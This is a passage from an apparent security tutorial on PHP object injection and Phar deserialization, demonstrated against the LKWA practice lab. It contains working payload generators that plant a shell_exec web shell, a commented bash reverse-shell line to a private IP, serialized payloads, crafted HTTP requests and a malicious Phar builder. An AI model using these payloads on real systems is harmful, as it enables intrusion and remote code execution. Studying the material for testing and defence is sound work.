</pre></td><td class="rouge-code"><pre><span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'object'</span><span class="p">])){</span>  
<span class="nv">$var1</span><span class="o">=</span><span class="nb">unserialize</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'object'</span><span class="p">]);</span>
<span class="k">echo</span> <span class="s2">"&lt;br&gt;"</span><span class="p">;</span>
<span class="k">echo</span><span class="p">(</span><span class="nv">$var1</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">);</span> 
<span class="k">echo</span> <span class="s2">"&lt;br&gt;"</span><span class="p">;</span>
<span class="k">echo</span><span class="p">(</span><span class="nv">$var1</span><span class="o">-&gt;</span><span class="n">text</span><span class="p">);</span>
<span class="p">}</span>

</pre></td></tr></tbody></table></code></div></div>

<p>Within content.php, the following file is also included:</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="k">include</span><span class="p">(</span><span class="s2">"obj_injection.php"</span><span class="p">);</span>
</pre></td></tr></tbody></table></code></div></div>

<p>obj_injection.php contains the following code.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre>// https://github.com/weev3/LKWA/blob/master/objectInjection/content.php#L3


<span class="cp">&lt;?php</span>


<span class="kd">class</span> <span class="nc">Foo</span><span class="p">{</span>
    <span class="k">function</span> <span class="n">__construct</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$data</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">filename</span> <span class="o">=</span> <span class="nv">$filename</span> <span class="mf">.</span> <span class="s2">".txt"</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">data</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">function</span> <span class="n">__destruct</span><span class="p">(){</span>
        <span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">filename</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="cp">?&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>This can be exploited using a payload such as:</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td class="rouge-code"><pre>&lt;?php

 class Foo{
    public $filename;
    public $data;

}

$obj = new Foo();
$obj-&gt;filename = '/var/www/html/shell.php';
$obj-&gt;data =  "&lt;?php echo shell_exec(\$_GET['e'].' 2&gt;&amp;1'); ?&gt;";
 
echo serialize($obj);
 
?&gt;
</pre></td></tr></tbody></table></code></div></div>

<p>Serialized Payload:</p>
<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>O:3:"Foo":2:{s:8:"filename";s:23:"/var/www/html/shell.php";s:4:"data";s:45:"<span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'e'</span><span class="p">]</span><span class="mf">.</span><span class="s1">' 2&gt;&amp;1'</span><span class="p">);</span> <span class="cp">?&gt;</span>";}
</pre></td></tr></tbody></table></code></div></div>

<p><strong>Example (https://github.com/weev3/LKWA) Object Injection Cookie</strong></p>

<p>When the admin logs in the following cookie are set by the application:</p>

<p><a href="/assets/img/blog/appsec/php2.png" class="popup img-link "><img data-src="/assets/img/blog/appsec/php2.png" alt="" class="lazyload" data-proofer-ignore></a></p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nc">O</span><span class="o">:</span><span class="mi">8</span><span class="o">:</span><span class="s2">"stdClass"</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span><span class="p">{</span><span class="n">s</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="s2">"user"</span><span class="p">;</span><span class="n">s</span><span class="o">:</span><span class="mi">5</span><span class="o">:</span><span class="s2">"admin"</span><span class="p">;}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>This is then unserialized:</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="c1">//https://github.com/weev3/LKWA/blob/master/objectInjection_cookie/content.php#L43</span>

<span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]))</span>
<span class="p">{</span>

  <span class="nv">$var</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]);</span>
  <span class="k">echo</span> <span class="s2">"&lt;br&gt; Welcome "</span><span class="mf">.</span><span class="nv">$var</span><span class="o">-&gt;</span><span class="n">user</span><span class="p">;</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Content.php also includes obj_injection.php <code class="language-plaintext highlighter-rouge">(include("obj_injection.php");)</code> which has the following code:</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre></td><td class="rouge-code"><pre>//http://lkwa.local:3000/objectInjection_cookie/content.php


<span class="cp">&lt;?php</span>

<span class="cd">/**
 * Object Injection via Cookie
 */</span>
<span class="kd">class</span> <span class="nc">Foo</span><span class="p">{</span>
	<span class="k">public</span> <span class="nv">$cmd</span><span class="p">;</span>
    <span class="k">function</span> <span class="n">__construct</span><span class="p">()</span> <span class="p">{</span>
    <span class="p">}</span>
    <span class="k">function</span> <span class="n">__destruct</span><span class="p">(){</span>
        <span class="k">eval</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">cmd</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="cp">?&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>This can be exploited using the following payload</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
 

 <span class="kd">class</span> <span class="nc">Foo</span><span class="p">{</span>
    <span class="k">public</span> <span class="nv">$cmd</span><span class="p">;</span>

<span class="p">}</span>
<span class="c1">///bin/bash -i &gt;&amp; /dev/tcp/192.168.0.11/1234 0&gt;&amp;1</span>
<span class="nv">$obj</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Foo</span><span class="p">();</span>
<span class="nv">$obj</span><span class="o">-&gt;</span><span class="n">cmd</span> <span class="o">=</span>  <span class="s2">"system('uname -a');"</span><span class="p">;</span>

<span class="k">echo</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$obj</span><span class="p">);</span>
 
<span class="cp">?&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>which generates the following serialized payload</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>O:3:"Foo":1:{s:3:"cmd";s:19:"system('uname -a');";}
</pre></td></tr></tbody></table></code></div></div>

<p>This can now be set as a cookie and can be sent to the page to execute uname -a on the local system.</p>

<p><strong>Example (https://github.com/weev3/LKWA) Object Injection Reference</strong></p>

<p>A serialized payload sent from a user request is deserialized as follows:</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre><span class="c1">//https://github.com/weev3/LKWA/blob/master/objectref/objectref.php</span>
                  <span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'guess'</span><span class="p">]))</span> <span class="p">{</span>
                    <span class="c1">// code...</span>
                    <span class="nv">$obj</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'input'</span><span class="p">]);</span>
                    <span class="k">if</span><span class="p">(</span><span class="nv">$obj</span><span class="p">)</span> <span class="p">{</span>
                        <span class="nv">$obj</span><span class="o">-&gt;</span><span class="n">guess</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'guess'</span><span class="p">];</span>
                        <span class="nv">$obj</span><span class="o">-&gt;</span><span class="n">secretCode</span> <span class="o">=</span> <span class="nb">rand</span><span class="p">(</span><span class="mi">500000</span><span class="p">,</span><span class="mi">999999</span><span class="p">);</span>
                        <span class="k">if</span><span class="p">(</span><span class="nv">$obj</span><span class="o">-&gt;</span><span class="n">guess</span> <span class="o">===</span> <span class="nv">$obj</span><span class="o">-&gt;</span><span class="n">secretCode</span><span class="p">)</span> <span class="p">{</span>
                            <span class="k">echo</span> <span class="s2">"&lt;p class='text-success'&gt;You Win !!!!!&lt;/p&gt;"</span><span class="p">;</span>
                        <span class="p">}</span>
                        <span class="k">else</span><span class="p">{</span>
                        	<span class="k">echo</span> <span class="s2">"&lt;p class='text-danger'&gt;Loser!!!!&lt;/p&gt;"</span><span class="p">;</span>
                        <span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>This check can be bypassed by calling both objects and referencing each other.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
 

 <span class="kd">class</span> <span class="nc">Object1</span>
 <span class="p">{</span>
   <span class="k">public</span> <span class="nv">$guess</span><span class="p">;</span>
   <span class="k">public</span> <span class="nv">$secretCode</span><span class="p">;</span>
 <span class="p">}</span>
 
<span class="nv">$obj</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Object1</span><span class="p">();</span>
<span class="nv">$obj</span><span class="o">-&gt;</span><span class="n">guess</span> <span class="o">=</span>  <span class="o">&amp;</span><span class="nv">$obj</span><span class="o">-&gt;</span><span class="n">secretCode</span><span class="p">;</span>
<span class="k">echo</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$obj</span><span class="p">);</span>
 
<span class="cp">?&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Payload:</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nc">O</span><span class="o">:</span><span class="mi">7</span><span class="o">:</span><span class="s2">"Object1"</span><span class="o">:</span><span class="mi">2</span><span class="o">:</span><span class="p">{</span><span class="n">s</span><span class="o">:</span><span class="mi">5</span><span class="o">:</span><span class="s2">"guess"</span><span class="p">;</span><span class="nc">N</span><span class="p">;</span><span class="n">s</span><span class="o">:</span><span class="mi">10</span><span class="o">:</span><span class="s2">"secretCode"</span><span class="p">;</span><span class="nc">R</span><span class="o">:</span><span class="mi">2</span><span class="p">;}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>The following request can now be sent</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre></td><td class="rouge-code"><pre>

POST /objectref/objectref.php HTTP/1.1
Host: lkwa.local:3000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 112
Origin: http://lkwa.local:3000
Connection: close
Referer: http://lkwa.local:3000/objectref/objectref.php
Cookie: PHPSESSID=741de8227f5dedc8918a2018980d0819; username=O%3A8%3A%22stdClass%22%3A1%3A%7Bs%3A4%3A%22user%22%3Bs%3A5%3A%22admin%22%3B%7D
Upgrade-Insecure-Requests: 1

guess=ss&amp;input=%4f%3a%37%3a%22%4f%62%6a%65%63%74%31%22%3a%32%3a%7b%73%3a%35%3a%22%67%75%65%73%73%22%3b%4e%3b%73%3a%31%30%3a%22%73%65%63%72%65%74%43%6f%64%65%22%3b%52%3a%32%3b%7d

</pre></td></tr></tbody></table></code></div></div>

<p><strong>Real World Vulnerabilities</strong></p>

<ul>
  <li><a href="https://websec.wordpress.com/2015/01/09/drupal-7-34-admin-php-object-injection/">Drupal 7.34 Admin PHP Object Injection</a></li>
  <li><a href="https://blog.redforce.io/attacking-helpdesks-part-1-rce-chain-on-deskpro-with-bitdefender-as-case-study/">Executing Arbitrary Code on Bitdefender Helpdesk</a></li>
  <li><a href="https://blog.ripstech.com/2018/prestashop-remote-code-execution/">Prestashop Remote Code Execution</a></li>
</ul>

<h3 id="useful-notes"><span class="mr-2">Useful Notes</span><a href="#useful-notes" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<ul>
  <li>Leading zeroes &amp; Arbitrary Chars can be used which won‚Äôt change logic: O:008:‚ÄùstdClass‚Äù:0001**s:006:‚Äùbypass‚Äù;b:1;}</li>
  <li>One way to find PHP deserialization black box is to provide a serialized PDO object to injection points. This will usually end in an error 500 response which is an indication of PHP deserialization. The php-object-injection-check burp extension can be used to automate this: https://github.com/securifybv/PHPUnserializeCheck</li>
  <li>https://github.com/ricardojba/poi-slinger burp extension can be used to quickly create out of band payloads from PHPGGC during testing.</li>
</ul>

<h3 id="how-to-patch"><span class="mr-2">How to Patch</span><a href="#how-to-patch" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Use a safe, standard data interchange format such as JSON (via json_decode() and json_encode()) if you need to pass serialized data to the user.</p>

<p><strong>References/Further Reading</strong></p>
<ul>
  <li>https://notsosecure.com/remote-code-execution-via-php-unserialize/</li>
  <li>https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection</li>
  <li>https://www.pentestpeople.com/php-deserialisation-object-injection/</li>
  <li>https://securitycafe.ro/2015/01/05/understanding-php-object-injection/</li>
  <li>https://insomniasec.com/cdn-assets/Practical_PHP_Object_Injection.pdf</li>
  <li>https://www.synacktiv.com/en/publications/typo3-leak-to-remote-code-execution.html</li>
  <li>https://web.archive.org/web/20150317142538/https://scott.arciszewski.me/research/view/php-framework-timing-attacks-object-injection</li>
  <li>https://blog.redteam-pentesting.de/2021/deserialization-gadget-chain/</li>
  <li>https://github.com/orangetw/My-CTF-Web-Challenges/blob/master/README.md#babyh-master-php-2017</li>
  <li>https://github.com/TYPO3/phar-stream-wrapper</li>
  <li>https://srcincite.io/blog/2018/10/02/old-school-pwning-with-new-school-tricks-vanilla-forums-remote-code-execution.html</li>
  <li>https://www.slideshare.net/_s_n_t/php-unserialization-vulnerabilities-what-are-we-missing</li>
</ul>

<h3 id="phar-file-format"><span class="mr-2">Phar File Format</span><a href="#phar-file-format" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Phar (PHP Archive) files can be used to package PHP applications and PHP libraries into one archive file. The PHAR format in PHP uses single file format which can be used to store and execute multiple PHP code. Phar files contain metadata about the files in the archive. In a phar file, metadata is stored in a serialized format</p>

<p>A structure of a PHAR file is as follow</p>

<ul>
  <li>A stub ‚Äì which is a PHP code sequence acting as a bootstrapper when the Phar is being run as a standalone application; as a minimum, it must contain the following code:</li>
</ul>

<p><code class="language-plaintext highlighter-rouge">&lt;?php __HALT_COMPILER();</code></p>

<ul>
  <li>A manifest describing a source file included in the archive; optionally, holds serialized meta-data (this serialized chunk is a critical link in the exploitation chain as we will see further on)</li>
  <li>A source file (the actual Phar functionality)</li>
  <li>An optional signature, used for integrity checks</li>
</ul>

<p>Phar files can be called using the following URI: zphar://full/or/relative/pathz. Furthermore, a phar file extension doesn‚Äôt get checked when declaring a stream, making phar files veritable polyglot candidates. If a filesystem function is called with a phar stream as an argument, the Phar‚Äôs serialized metadata automatically gets unserialized, by design. More about the PHP Phar format can be seen here: https://www.php.net/manual/en/book.phar.php</p>

<h3 id="phar-deserialization"><span class="mr-2">Phar Deserialization</span><a href="#phar-deserialization" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Discovered by Sam Thomas and initially discovered by Orange Tsai (Separately), if a file operation is performed on a phar file via the phar:// wrapper, the phar file‚Äôs metadata would be unserialized. As such an attacker could perform PHP object injection without the use of the unserialize() function by uploading a phar file.</p>

<p>Sam Thomas‚Äôs work can be seen below:</p>

<ul>
  <li><a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf">BlackHat USA 2018 - Its A PHP Unserialization Vulnerability Jim But Not As We Know It Slides</a></li>
  <li><a href="https://www.youtube.com/watch?v=OrEar0TiS90">BlackHat USA 2018 - Its A PHP Unserialization Vulnerability Jim But Not As We Know It Video</a></li>
</ul>

<h3 id="requirements-for-a-successful-phar-deserialization"><span class="mr-2">Requirements for a Successful Phar Deserialization</span><a href="#requirements-for-a-successful-phar-deserialization" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<ul>
  <li>A PHP filesystem function that can be controlled which will trigger unserialize()</li>
  <li>The ability to upload a PHAR file to the target system and the path of this file to be known</li>
</ul>

<p>The following file system functions can trigger<code class="language-plaintext highlighter-rouge">unserialize()</code> by providing a <code class="language-plaintext highlighter-rouge">phar://</code> wrapper</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre>copy                file_exists         file_get_contents   file_put_contents   
file                fileatime           filectime           filegroup           
fileinode           filemtime           fileowner           fileperms           
filesize            filetype            fopen               is_dir              
is_executable       is_file             is_link             is_readable         
is_writable         lstat               mkdir               parse_ini_file      
readfile            rename              rmdir               stat                
touch               unlink  
</pre></td></tr></tbody></table></code></div></div>

<p><strong>Note:</strong> Just like normal object injection, PHP Magic Methods and autoloading/include of the POP gadget to trigger is still needed.</p>

<p><strong>Example (https://github.com/weev3/LKWA) Phar Deserialization</strong></p>

<p>An upload functionality exists in upload.php</p>

<p><a href="/assets/img/blog/appsec/php3.png" class="popup img-link "><img data-src="/assets/img/blog/appsec/php3.png" alt="" class="lazyload" data-proofer-ignore></a></p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
</pre></td><td class="rouge-code"><pre>&lt;?php
include("sidebar.php");
$target_dir = "uploads/";
$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
$uploadOk = 1;
$imageFileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));
// Check if image file is a actual image or fake image
if(isset($_POST["submit"])) {
    if($imageFileType !== "PHAR") {
        $uploadOk = 1;
    } else {
        echo "File is not a PHAR file.";
        $uploadOk = 0;
    }
}
// Check if file already exists
if (file_exists($target_file)) {
    echo "Sorry, file already exists.";
    $uploadOk = 0;
}

// Allow certain file formats
if($imageFileType != "phar") {
    echo "Sorry, only PHAR file is allowed.";
    $uploadOk = 0;
}
// Check if $uploadOk is set to 0 by an error
if ($uploadOk == 0) {
    echo "Sorry, your file was not uploaded.";
// if everything is ok, try to upload file
} else {
    if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
        echo "The file ". basename( $_FILES["fileToUpload"]["name"]). " has been uploaded.";
    } else {
        echo "Sorry, there was an error uploading your file.";
    }
}
?&gt;
</pre></td></tr></tbody></table></code></div></div>

<p><em>https://github.com/weev3/LKWA/blob/master/phar_deserial/upload.php</em></p>

<p>This above code checks if a given upload is a phar file, the file_exists function is also used to see if the file has already been uploaded. Aftr the checks, the file is uploaded. This functionality can be used to upload a PHAR file.</p>

<p>Within phar_deserial.php, the following code can be seen:</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre><span class="k">include</span><span class="p">(</span><span class="s2">"sidebar.php"</span><span class="p">);</span>

<span class="kd">class</span> <span class="nc">log</span>
<span class="p">{</span>
	<span class="k">public</span> <span class="nv">$filename</span><span class="o">=</span><span class="s2">"log.txt"</span><span class="p">;</span>
	<span class="k">public</span> <span class="nv">$data</span><span class="o">=</span><span class="s2">"log"</span><span class="p">;</span>
    <span class="k">function</span> <span class="n">__wakeup</span><span class="p">(){</span>
        <span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">filename</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">if</span> <span class="p">(</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'file'</span><span class="p">]))</span> <span class="p">{</span>
 <span class="nv">$var</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">log</span><span class="p">();</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>
<p><em>https://github.com/weev3/LKWA/blob/master/phar_deserial/phar_deserial.php</em></p>

<p>Since the file_exists($_GET[‚Äòfile‚Äô] function is used with a user provided input. It is possible to set the value of the input to the previously uploaded Phar file. Example: phar://../uploads/phar_file.phar. The PHP application will perform a filesystem call on the provided wrapper, such as verifying if the file exists on the disk by calling file_exists(‚Äúphar://../uploads/phar_file.phar‚Äù). and the Phar‚Äôs metadata will be unserialized, taking advantage of the gadgets/POP chains to complete the exploitation chain. In this instance, the __wakeup magic method can be leveraged for code execution by writing some PHP code and calling it.</p>

<p>The following code can be used to create a PHAR file</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="kd">class</span> <span class="nc">log</span>
<span class="p">{</span>
    
    <span class="k">function</span> <span class="n">__wakeup</span><span class="p">(){</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="nv">$payload</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">log</span><span class="p">();</span>
<span class="nv">$payload</span><span class="o">-&gt;</span><span class="n">filename</span> <span class="o">=</span> <span class="s1">'shell.php5'</span><span class="p">;</span>
<span class="nv">$payload</span><span class="o">-&gt;</span><span class="n">data</span> <span class="o">=</span> <span class="s2">"&lt;?php echo shell_exec(</span><span class="se">\$</span><span class="s2">_GET['e'].' 2&gt;&amp;1'); ?&gt;"</span><span class="p">;</span>
<span class="nb">var_dump</span><span class="p">(</span><span class="nv">$payload</span><span class="p">);</span>

<span class="c1">// create new Phar</span>
<span class="o">@</span><span class="nb">unlink</span><span class="p">(</span><span class="s2">"payload.phar"</span><span class="p">);</span>
<span class="nv">$phar</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Phar</span><span class="p">(</span><span class="s1">'payload.phar'</span><span class="p">);</span>
<span class="nv">$phar</span><span class="o">-&gt;</span><span class="nf">startBuffering</span><span class="p">();</span>
<span class="nv">$phar</span><span class="o">-&gt;</span><span class="nf">addFromString</span><span class="p">(</span><span class="s1">'test.txt'</span><span class="p">,</span> <span class="s1">'text'</span><span class="p">);</span>
<span class="nv">$phar</span><span class="o">-&gt;</span><span class="nf">setStub</span><span class="p">(</span><span class="s1">'&lt;?php __HALT_COMPILER(); ? &gt;'</span><span class="p">);</span>
<span class="c1">//set payload</span>
<span class="nv">$phar</span><span class="o">-&gt;</span><span class="nf">setMetadata</span><span class="p">(</span><span class="nv">$payload</span><span class="p">);</span>
<span class="nv">$phar</span><span class="o">-&gt;</span><span class="nf">stopBuffering</span><span class="p">();</span>
<span class="cp">?&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>This phar file can be uploaded using upload.php.</p>

<p><a href="/assets/img/blog/appsec/php4.png" class="popup img-link "><img data-src="/assets/img/blog/appsec/php4.png" alt="" class="lazyload" data-proofer-ignore></a></p>

<p>This payload.phar can be called through the phar_deserial.php file.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre>GET /phar_deserial/phar_deserial.php?file=phar%3a%2f%2fpharfile.phar HTTP/1.1
Host: lkwa.local:3000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: username=O%3A8%3A%22stdClass%22%3A1%3A%7Bs%3A4%3A%22user%22%3Bs%3A5%3A%22admin%22%3B%7D
Upgrade-Insecure-Requests: 1
</pre></td></tr></tbody></table></code></div></div>

<p>To test if things are working locally, you can testing using a code such as</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
